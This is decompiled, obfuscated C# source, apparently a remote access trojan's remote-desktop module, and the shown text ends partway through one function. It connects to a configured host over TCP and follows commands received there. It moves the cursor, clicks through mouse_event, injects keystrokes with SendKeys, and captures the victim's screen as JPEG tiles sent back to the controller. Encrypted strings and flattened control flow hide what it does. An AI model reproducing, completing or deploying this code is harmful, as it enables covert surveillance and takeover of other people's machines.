using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class _____________________________
{
	private delegate void ______________________________(string string_0);

	private bool __;

	private ______________________________ ___;

	public StreamWriter ____;

	public StreamReader _____;

	private string m_______;

	public string _______;

	private static List<Bitmap> m_________ = new List<Bitmap>();

	private static List<Point> m__________ = new List<Point>();

	private static Bitmap m___________ = new Bitmap(1, 1);

	private int m____________;

	private int m_____________;

	private int m______________;

	private static int m_______________ = 0;

	private static int m________________ = 0;

	private static int m_________________ = 0;

	private event ______________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			___ = (______________________________)Delegate.Combine(___, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			___ = (______________________________)Delegate.Remove(___, value);
		}
	}

	public _____________________________()
	{
		__ = false;
		this.m_______ = _003CModule_003E._______<string>(363088510u);
		this._______ = _003CModule_003E._____<string>(2630718865u);
		this.m____________ = 5;
		this.m_____________ = 5;
		this.m______________ = 50;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	public unsafe void ____(byte[] byte_0)
	{
		string text = ___________(byte_0);
		string[] array = Strings.Split(text, this._______, -1, (CompareMethod)0);
		string text2 = array[0];
		try
		{
			int num = default(int);
			if (~((uint)(num * 1100) % 65536u) == (uint)(num * 1677721600 << 2))
			{
				goto IL_0366;
			}
			goto IL_046b;
			IL_046b:
			string[] array2 = default(string[]);
			if (text2.Contains(_003CModule_003E.______<string>(1514956238u)))
			{
				array2 = Strings.Split(text2, _003CModule_003E.____<string>(4093950867u), -1, (CompareMethod)0);
			}
			goto IL_03f6;
			IL_0366:
			Point position = default(Point);
			Cursor.set_Position(position);
			_____(string.Empty);
			goto IL_03b8;
			IL_03f6:
			nint num2;
			if (text2.Contains(_003CModule_003E._______<string>(2428413336u)))
			{
				position = new Point(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[2]));
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
				goto IL_0316;
			}
			goto IL_03b8;
			IL_01d7:
			Size size = default(Size);
			string text3 = size.Width.ToString();
			int height = size.Height;
			int num3 = default(int);
			string text4 = default(string);
			string[] array3 = default(string[]);
			if (num3 != 19556)
			{
				text4 = height.ToString();
				array3 = new string[8]
				{
					_003CModule_003E._______<string>(417861058u),
					null,
					null,
					null,
					null,
					null,
					null,
					null
				};
				num3 = sizeof(ulong) + -27600;
				num2 = (nint)Type.EmptyTypes.LongLength + 8;
				goto IL_0316;
			}
			goto IL_040b;
			IL_03b8:
			if (!text2.Contains(_003CModule_003E.___<string>(1040935495u)))
			{
				goto IL_0042;
			}
			num3 = 1472;
			if ((nint)Type.EmptyTypes.LongLength + 10336 != -30847)
			{
				position = new Point(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[2]));
				num2 = (nint)Type.EmptyTypes.LongLength + 2;
				goto IL_0316;
			}
			goto IL_03f6;
			IL_01af:
			if (Operators.CompareString(text2, _003CModule_003E.____<string>(4283754960u), false) == 0)
			{
				num3 = 2965;
				if ((((num | 0x27FF) * 256 - -286334976 != ~(-(num << 25))) ? 25630 : ((nint)Type.EmptyTypes.LongLength + -544776276)) == -49)
				{
					goto IL_01d7;
				}
				_______();
			}
			int num4 = default(int);
			if (text2.Contains(_003CModule_003E._______<string>(582178702u)))
			{
				num3 = 6784;
				if (((((num4 * 32768) | -105) != -105) ? ((nint)Type.EmptyTypes.LongLength + 697471474) : 2965) != 2965)
				{
					goto IL_01d7;
				}
				SendKeys.SendWait(array2[1]);
			}
			if (Operators.CompareString(text2, _003CModule_003E._______<string>(2592730980u), false) != 0)
			{
				return;
			}
			num3 = 1301;
			MemoryStream memoryStream = default(MemoryStream);
			if ((nint)Type.EmptyTypes.LongLength + 6784 != 10515)
			{
				memoryStream = new MemoryStream();
				size = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
				num = num3;
				num3 = -14156;
				if (num != 1301)
				{
					goto IL_014a;
				}
				goto IL_01d7;
			}
			goto IL_0236;
			IL_0236:
			Cursor.set_Position(position);
			string[] array4 = default(string[]);
			mouse_event(Conversions.ToInteger(array4[3]), 0, 0, 0, 1);
			num2 = sizeof(ushort) + 4;
			goto IL_0316;
			IL_0042:
			if (!text2.Contains(_003CModule_003E._____<string>(1730010089u)))
			{
				goto IL_0155;
			}
			num3 = (int)((nint)Type.EmptyTypes.LongLength + 5377);
			num2 = (nint)Type.EmptyTypes.LongLength + 5;
			goto IL_0316;
			IL_040b:
			array3[3] = this._______;
			array3[4] = text3;
			num3 = 29351;
			goto IL_0423;
			IL_0155:
			if (!text2.Contains(_003CModule_003E.______<string>(2075491362u)))
			{
				goto IL_01af;
			}
			num2 = sizeof(Guid) + -7;
			goto IL_0316;
			IL_014a:
			_____(string.Empty);
			goto IL_0155;
			IL_0316:
			while (true)
			{
				switch (num2)
				{
				case 9:
					break;
				case 6:
					goto IL_014a;
				case 7:
					position = new Point(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
					if (num3 == -29728)
					{
						num4 = _003CModule_003E._______________;
						if ((0x201E68u ^ ((uint)num4 % 524288u)) != 0)
						{
							goto case 2;
						}
					}
					goto IL_0236;
				case 2:
					Cursor.set_Position(position);
					mouse_event(Conversions.ToInteger(array2[3]), 0, 0, 0, 1);
					num2 = sizeof(byte) + 2;
					continue;
				case 5:
				{
					string[] array5 = Strings.Split(text2, _003CModule_003E.______<string>(3729527540u), -1, (CompareMethod)0);
					if (num3 != 5377)
					{
						break;
					}
					array4 = Strings.Split(array5[1], _003CModule_003E.___<string>(3242391558u), -1, (CompareMethod)0);
					num3 = (int)((nint)Type.EmptyTypes.LongLength + -3040);
					num2 = (nint)Type.EmptyTypes.LongLength + 7;
					continue;
				}
				case 3:
					goto IL_030a;
				case 8:
					goto IL_0348;
				case 0:
					goto IL_0366;
				default:
					goto IL_03f6;
				case 4:
					goto IL_0423;
				}
				break;
			}
			_____(text2);
			goto IL_01af;
			IL_0348:
			array3[1] = this._______;
			array3[2] = ______________________________________________________________.________________________;
			if (num3 != -27592)
			{
				goto IL_0366;
			}
			goto IL_040b;
			IL_030a:
			Thread.Sleep(50);
			goto IL_0042;
			IL_0423:
			array3[5] = this._______;
			array3[6] = text4;
			if (num3 != 29351 || (-310 | (num4 * 2404864)) != -310)
			{
				goto IL_046b;
			}
			array3[7] = this._______;
			string text5 = string.Concat(array3);
			memoryStream.Write(__________(text5), 0, text5.Length);
			______(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void _____(string string_0)
	{
		try
		{
			string[] array = default(string[]);
			int num = default(int);
			if (string_0.Contains(_003CModule_003E.____<string>(3008796200u)))
			{
				array = Strings.Split(string_0, _003CModule_003E._______<string>(1974200954u), -1, (CompareMethod)0);
				num = 18253;
				int num2 = default(int);
				int num3 = num2 * 1046723648 - 3578 - 266528;
				int num4 = ______________________._______;
				if (((num3 == 4 * (8 * num4 + 8 * num4)) ? 1108822575 : (-27307)) != -27307)
				{
					goto IL_0084;
				}
				goto IL_00af;
			}
			goto IL_0101;
			IL_0084:
			MemoryStream memoryStream = new MemoryStream();
			string text = _003CModule_003E.___<string>(1283373911u) + this._______;
			byte[] array2 = default(byte[]);
			if (num != -17649)
			{
				memoryStream.Write(__________(text), 0, text.Length);
				memoryStream.Write(array2, 0, array2.Length);
				______(memoryStream.ToArray());
				memoryStream.Dispose();
				return;
			}
			goto IL_00af;
			IL_00e0:
			this.m______________ = Convert.ToInt32(array[3]);
			goto IL_0101;
			IL_00d3:
			nint num5;
			switch (num5)
			{
			case 0:
				break;
			default:
				goto IL_00e0;
			}
			goto IL_0084;
			IL_00af:
			this.m____________ = Convert.ToInt32(array[1]);
			this.m_____________ = Convert.ToInt32(array[2]);
			num5 = (nint)Type.EmptyTypes.LongLength + 1;
			goto IL_00d3;
			IL_0101:
			array2 = ___________________(this.m____________, this.m_____________, this.m______________);
			num = (int)((128385024 * num * 8192 - -723517440 == num << 25) ? (sizeof(long) + 1380311903) : ((nint)Type.EmptyTypes.LongLength + -23322));
			num5 = sizeof(Guid) + -16;
			goto IL_00d3;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void ______(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(__________(this.m_______), 0, this.m_______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public void _______()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 224:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_0088;
						case 6:
							goto IL_0095;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001b:
					num = 4;
					this._.Close();
					if ((((uint)num3 % 443397530u) & 0xE0000000u) != 0)
					{
						int num5 = _003CModule_003E._____________;
						if (num5 * 23 + 105 * num5 - -5845 != -9087)
						{
							goto IL_0057;
						}
						num6 = (nint)Type.EmptyTypes.LongLength + -1916263808;
					}
					else
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1;
					}
					goto IL_0079;
					IL_0008:
					num = 2;
					__________________();
					goto IL_000f;
					IL_000f:
					num = 3;
					num6 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0079;
					IL_0079:
					switch (num6)
					{
					case 1:
						goto IL_0088;
					}
					goto IL_0057;
					IL_0088:
					num = 5;
					this.____.Close();
					goto IL_0095;
					IL_0095:
					num = 6;
					this._____.Close();
					break;
					IL_0057:
					Thread.Sleep(250);
					goto IL_001b;
					end_IL_0000_2:
					break;
				}
				num = 7;
				Thread.CurrentThread.Abort();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 224;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ________()
	{
		try
		{
			______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E._______<string>(2921366268u));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			int num = 1;
			while (true)
			{
				switch (num)
				{
				case 0:
				{
					Thread.Sleep(1000);
					string string_ = _003CModule_003E.____<string>(3593425603u) + ______________________________________________________________.________________________ + _003CModule_003E.______<string>(861631917u);
					_____________(string_);
					Thread thread = new Thread(_________);
					thread.Start();
					return;
				}
				}
				this._.ReceiveBufferSize = 9999999;
				this._.SendBufferSize = 9999999;
				num = sizeof(ushort) + -2;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.____<string>(1187660804u), _003CModule_003E._____<string>(904978708u) + ex2.ToString());
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void _________()
	{
		MemoryStream memoryStream = new MemoryStream();
		Array array2 = default(Array);
		while (true)
		{
			try
			{
				if (this._.Available > 0)
				{
					byte[] array = new byte[this._.Available - 1 + 1];
					this._.Client.Receive(array, 0, array.Length, SocketFlags.None);
					nint num = (nint)Type.EmptyTypes.LongLength + 2;
					while (true)
					{
						switch (num)
						{
						case 4:
							____((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
							num = sizeof(ulong) + -8;
							continue;
						case 3:
							if (!___________(memoryStream.ToArray()).Contains(_003CModule_003E.______<string>(3743344457u)))
							{
								break;
							}
							array2 = ____________(memoryStream.ToArray(), _003CModule_003E._____<string>(1355333096u));
							goto case 4;
						default:
							memoryStream.Write(array, 0, array.Length);
							num = (nint)Type.EmptyTypes.LongLength + 3;
							continue;
						case 1:
							memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, _003CModule_003E.____<string>(527765695u), new object[0], (string[])null, (Type[])null, (bool[])null)));
							Thread.Sleep(1);
							goto case 3;
						case 0:
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length != 2)
							{
								break;
							}
							goto case 1;
						}
						break;
					}
				}
				Thread.Sleep(10);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public static byte[] __________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public static string ___________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public unsafe static Array ____________(byte[] byte_0, string string_0)
	{
		int num = _003CModule_003E.__________;
		List<byte[]> list = default(List<byte[]>);
		MemoryStream memoryStream = default(MemoryStream);
		MemoryStream memoryStream2 = default(MemoryStream);
		string[] array = default(string[]);
		if (1008640 + ((uint)(128 * num) >> 7) != (uint)num)
		{
			list = new List<byte[]>();
			memoryStream = new MemoryStream();
			memoryStream2 = new MemoryStream();
			array = Strings.Split(___________(byte_0), string_0, -1, (CompareMethod)0);
			nint num2 = sizeof(ushort) + -1;
			while (true)
			{
				switch (num2)
				{
				default:
					goto IL_0046;
				case 0:
					break;
				}
				break;
				IL_0046:
				memoryStream.Write(byte_0, 0, array[0].Length);
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
			}
		}
		memoryStream2.Write(byte_0, array[0].Length + string_0.Length, byte_0.Length - (array[0].Length + string_0.Length));
		list.Add(memoryStream.ToArray());
		list.Add(memoryStream2.ToArray());
		memoryStream.Dispose();
		memoryStream2.Dispose();
		return list.ToArray();
	}

	public void _____________(string string_0)
	{
		try
		{
			this.____ = new StreamWriter(this._.GetStream());
			this.____.WriteLine(_003CModule_003E._______<string>(1020359086u) + string_0);
			this.____.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	private unsafe static Size ______________(int int_0)
	{
		Size result;
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			result = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			int num = _003CModule_003E.____________;
			nint num2;
			if (2051692361 + ((uint)num / 3462917u >> 24) == (uint)(0x1D9A & num))
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 1522509316;
				goto IL_00d1;
			}
			goto IL_014b;
			IL_00ec:
			result.Width = (int)Math.Round((double)result.Width / 4.0);
			num2 = (nint)Type.EmptyTypes.LongLength + 2;
			goto IL_00d1;
			IL_014b:
			switch (int_0)
			{
			case 13:
				break;
			case 11:
				goto IL_00ec;
			case 5:
				goto IL_0115;
			case 3:
				goto IL_018e;
			case 0:
				return result;
			default:
				goto end_IL_01e1;
			}
			result.Width = (int)Math.Round((double)result.Width / 6.0);
			num3 = (int)((((num3 * 67 + num3 * 445 - 5181) & 0x165) != 321) ? ((nint)Type.EmptyTypes.LongLength + 1301828542) : (((0xFFFFDAC7u ^ ((uint)num / 2u)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 2043683212) : ((((uint)(num + (num & (num + num)) + (0x218F & num)) ^ 0x9AFA419Fu) != 0) ? (sizeof(int) + 640) : ((nint)Type.EmptyTypes.LongLength + 1213469206))));
			num2 = sizeof(float) + -4;
			goto IL_00d1;
			IL_018e:
			result.Width = (int)Math.Round((double)result.Width / 1.5);
			num3 = -14467;
			if (-(num4 & 0x18D2) * 134217728 - -671088640 != (int)((uint)num4 >> 6))
			{
				result.Height = (int)Math.Round((double)result.Height / 1.5);
				if (num3 == -11331)
				{
				}
				break;
			}
			continue;
			IL_00d1:
			while (true)
			{
				switch (num2)
				{
				case 2:
					result.Height = (int)Math.Round((double)result.Height / 4.0);
					num2 = (nint)Type.EmptyTypes.LongLength + 4;
					continue;
				case 3:
					result.Height = (int)Math.Round((double)result.Height / 2.0);
					if (num3 != -11066)
					{
						goto end_IL_01e1;
					}
					goto case 0;
				case 0:
					result.Height = (int)Math.Round((double)result.Height / 6.0);
					if (num3 == 644)
					{
					}
					goto end_IL_01e1;
				case 4:
					goto end_IL_01e1;
				}
				break;
			}
			goto IL_014b;
			IL_0115:
			result.Width = (int)Math.Round((double)result.Width / 2.0);
			num3 = (int)((nint)Type.EmptyTypes.LongLength + 3282);
			num2 = (nint)Type.EmptyTypes.LongLength + 3;
			goto IL_00d1;
			continue;
			end_IL_01e1:
			break;
		}
		result.Width = Conversions.ToInteger(Strings.Mid(result.Width.ToString(), 1, result.Width.ToString().Length - 1) + Conversions.ToString(0));
		int height = result.Height;
		_003CModule_003E.____________ = -1529522494;
		result.Height = Conversions.ToInteger(Strings.Mid(height.ToString(), 1, result.Height.ToString().Length - 1) + Conversions.ToString(0));
		return result;
	}

	private unsafe static Image _______________(int int_0 = 0, int int_1 = 0, bool bool_0 = true)
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		Image result = default(Image);
		try
		{
			int width = Screen.get_PrimaryScreen().get_Bounds().Width;
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			_003CModule_003E.______ = 1386028750;
			Rectangle rectangle = bounds;
			switch (sizeof(ushort))
			{
			default:
			{
				int height = rectangle.Height;
				Bitmap val = new Bitmap(width, height);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				val2.set_CompositingQuality((CompositingQuality)2);
				int width2 = Screen.get_PrimaryScreen().get_Bounds().Width;
				Rectangle rectangle2 = Screen.get_PrimaryScreen().get_Bounds();
				Size size = new Size(width2, rectangle2.Height);
				val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
				if (bool_0)
				{
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle2 = new Rectangle(position, size);
						@default.Draw(val2, rectangle2);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				val2.Dispose();
				if (int_0 == 0 && int_1 == 0)
				{
					result = (Image)(object)val;
					return result;
				}
				IntPtr intPtr = default(IntPtr);
				result = ((Image)val).GetThumbnailImage(int_0, int_1, (GetThumbnailImageAbort)null, intPtr);
				return result;
			}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string ________________(byte[] byte_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte_0 = mD5CryptoServiceProvider.ComputeHash(byte_0);
		return Convert.ToBase64String(byte_0);
	}

	public unsafe static ImageCodecInfo _________________(string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ImageCodecInfo[] imageEncoders = default(ImageCodecInfo[]);
		int num5 = default(int);
		ImageCodecInfo val = default(ImageCodecInfo);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				ImageCodecInfo obj;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0009;
				case 180:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0027;
						case 4:
							goto IL_0036;
						case 6:
						case 7:
							goto IL_0059;
						case 5:
							goto IL_0061;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0061:
					num = 5;
					obj = imageEncoders[num5];
					__________________________________.____________ = val;
					val = obj;
					goto end_IL_0000_3;
					IL_0009:
					num = 2;
					imageEncoders = ImageCodecInfo.GetImageEncoders();
					if (sizeof(int) + -4316 != -4312)
					{
						goto default;
					}
					goto IL_0027;
					IL_0027:
					num = 3;
					num6 = imageEncoders.Length;
					num5 = 0;
					goto IL_0031;
					IL_0031:
					if (num5 > num6)
					{
						break;
					}
					goto IL_0036;
					IL_0036:
					num = 4;
					if (Operators.CompareString(imageEncoders[num5].get_MimeType(), string_0, false) != 0)
					{
						goto IL_0059;
					}
					if (num3 - 1610612736 == num3)
					{
						goto default;
					}
					goto IL_0061;
					IL_0059:
					num = 7;
					num5++;
					goto IL_0031;
					end_IL_0000_2:
					break;
				}
				num = 8;
				val = null;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 180;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		ImageCodecInfo result = val;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void __________________()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		_____________________________.m_______________ = -1;
		_____________________________.m________________ = -1;
		_____________________________.m_________________ = -1;
		_____________________________.m___________ = new Bitmap(1, 1);
	}

	public unsafe static byte[] ___________________(int int_0, int int_1, int int_2)
	{
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_04d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d3: Expected O, but got Unknown
		//IL_07ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d1: Expected O, but got Unknown
		//IL_0ae3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aea: Expected O, but got Unknown
		//IL_0af9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aff: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			int num4 = default(int);
			int x = default(int);
			int num5 = default(int);
			int num6 = default(int);
			int num7 = default(int);
			Bitmap val2 = default(Bitmap);
			Bitmap val = default(Bitmap);
			List<Bitmap> list = default(List<Bitmap>);
			int num9 = default(int);
			Bitmap val3 = default(Bitmap);
			MemoryStream memoryStream = default(MemoryStream);
			byte[] byte_ = default(byte[]);
			MemoryStream memoryStream3 = default(MemoryStream);
			int num15 = default(int);
			List<Point> list2 = default(List<Point>);
			int num16 = default(int);
			int num17 = default(int);
			int num18 = default(int);
			int height = default(int);
			int num19 = default(int);
			int num20 = default(int);
			int width = default(int);
			int num21 = default(int);
			List<int> list4 = default(List<int>);
			int num13 = default(int);
			List<int>.Enumerator enumerator = default(List<int>.Enumerator);
			int current = default(int);
			int num23 = default(int);
			int num27 = default(int);
			int num28 = default(int);
			int num31 = default(int);
			while (true)
			{
				IL_0742:
				Size size = new Size((Point)______________(int_0));
				int num = size.Width;
				string text = num.ToString();
				int num2 = size.Width;
				size.Width = Conversions.ToInteger(Strings.Mid(text, 1, num2.ToString().Length - 1) + Conversions.ToString(0));
				int num3 = 17404;
				if (((969 + num4 != -num4) ? (-7052) : (-1415668739)) != -7052)
				{
					goto IL_05d5;
				}
				num2 = size.Height;
				string text2 = num2.ToString();
				num = size.Height;
				size.Height = Conversions.ToInteger(Strings.Mid(text2, 1, num.ToString().Length - 1) + Conversions.ToString(0));
				num3 = (int)((nint)Type.EmptyTypes.LongLength + 27632);
				goto IL_06e0;
				IL_05d5:
				Bitmap obj = _____________________________.m___________;
				Rectangle rectangle = new Rectangle(x, num5, num6, num7);
				val2 = obj.Clone(rectangle, ((Image)val).get_PixelFormat());
				nint num8 = (nint)Type.EmptyTypes.LongLength + 6;
				goto IL_0600;
				IL_0645:
				_____________________________.m_______________ = int_0;
				_____________________________.m________________ = int_1;
				_____________________________.m_________________ = int_2;
				list = new List<Bitmap>();
				num9 = ______________________._______;
				num3 = sizeof(byte) + -26342;
				int num10 = _003CModule_003E.___________;
				num8 = (((((uint)num10 / 323590u) & ((uint)(134217728 * num10) / 268435456u)) != 2221855019u) ? ((nint)Type.EmptyTypes.LongLength + 11) : (((0x1A40 ^ (num2 << 16)) - 576863472 == (int)((uint)num7 % 29037696u >> 25)) ? ((nint)Type.EmptyTypes.LongLength + 1302781776) : (sizeof(Guid) + 1876735659)));
				goto IL_0600;
				IL_0600:
				while (true)
				{
					switch (num8)
					{
					case 3:
						break;
					case 5:
						goto IL_0247;
					case 8:
						goto IL_0273;
					case 11:
						goto IL_02b3;
					case 2:
						goto IL_031b;
					case 7:
						goto IL_037c;
					case 1:
						goto IL_0382;
					case 10:
						goto IL_0549;
					case 6:
					{
						((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						byte_ = memoryStream.ToArray();
						int num11 = global::___________._;
						num3 = (int)((((num11 * 16) ^ (num11 << 24)) == 5030) ? (sizeof(long) + 1395518895) : ((nint)Type.EmptyTypes.LongLength + -24264));
						num8 = (nint)Type.EmptyTypes.LongLength + 10;
						continue;
					}
					case 4:
						goto end_IL_0600;
					case 0:
						goto IL_0645;
					default:
						goto IL_06e0;
					}
					goto IL_015a;
					IL_0549:
					memoryStream.Dispose();
					memoryStream = new MemoryStream();
					((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					int num12 = num3;
					num3 = -22886;
					if (num12 == -24264)
					{
						goto IL_033e;
					}
					goto IL_04ba;
					IL_015a:
					num3 = -14071;
					if (num13 - 9935 == (int)((uint)(-(15 * num13 + 17 * num13)) >> 5))
					{
						goto IL_033e;
					}
					if (num7.ToString().Contains(_003CModule_003E.______<string>(1060962588u)))
					{
						num7 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num7), _003CModule_003E._______<string>(1916090129u), -1, (CompareMethod)0)[0]);
						if (204 * num + 820 * num != 7798 && num3 == -8071)
						{
							goto IL_02b3;
						}
					}
					goto IL_04ba;
					IL_0bc6:
					nint num14;
					string text3;
					Bitmap val4;
					switch (num14)
					{
					case 2:
						break;
					default:
						goto IL_0a97;
					case 0:
						goto IL_0ae2;
					case 1:
					{
						MemoryStream memoryStream2 = new MemoryStream();
						memoryStream2.Write(Encoding.Default.GetBytes(text3), 0, text3.Length);
						memoryStream2.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
						_____________________________.m___________ = val;
						((Image)val4).Dispose();
						result = memoryStream2.ToArray();
						return result;
					}
					}
					goto IL_0a66;
					IL_031b:
					num4 += ((Image)list[num15]).get_Height();
					if (num3 != 13515)
					{
						goto IL_0742;
					}
					goto IL_03c7;
					IL_03c7:
					num15++;
					goto IL_03cd;
					IL_02b3:
					while (true)
					{
						list2 = new List<Point>();
						if (_____________________________.m_________.Count <= 0)
						{
							break;
						}
						list.AddRange(_____________________________.m_________.ToArray());
						num12 = num3;
						num3 = -29861;
						if (num12 != -26341)
						{
							continue;
						}
						goto IL_020e;
					}
					val = (Bitmap)_______________(size.Width, size.Height);
					num3 = 6353;
					if ((nint)Type.EmptyTypes.LongLength + 5562 != 5562)
					{
						goto IL_00e4;
					}
					goto IL_0522;
					IL_020e:
					_____________________________.m_________.Clear();
					list2.AddRange(_____________________________.m__________.ToArray());
					_____________________________.m__________.Clear();
					if (num3 != -29861)
					{
						goto IL_06e0;
					}
					val = _____________________________.m___________;
					goto IL_0247;
					IL_0a66:
					_____________________________.m__________.Add(list2[num16]);
					goto IL_0a79;
					IL_0247:
					num3 = -18724;
					if (list.Count == 0)
					{
						byte[] array = new byte[1];
						num12 = num3;
						num3 = -25672;
						if (num12 == -18724)
						{
							array[0] = 0;
							result = array;
							return result;
						}
						goto IL_0273;
					}
					goto IL_02cf;
					IL_0472:
					if (num17 > num18)
					{
						num8 = sizeof(Guid) + -9;
						continue;
					}
					num5 = (int)Math.Round((double)height / (double)int_1 * (double)num19);
					num3 = (int)((nint)Type.EmptyTypes.LongLength + -1959);
					num20 = _003CModule_003E._______________;
					num8 = 8;
					continue;
					IL_0273:
					x = (int)Math.Round((double)width / (double)int_1 * (double)num17);
					num12 = num3;
					num3 = -8565;
					if (num12 == -1959 && (uint)num19 % 8388608u != 3326501867u)
					{
						goto IL_00e4;
					}
					goto IL_033e;
					IL_0370:
					((Image)val3).Dispose();
					goto IL_0465;
					IL_033e:
					byte[] byte_2 = memoryStream.ToArray();
					memoryStream.Dispose();
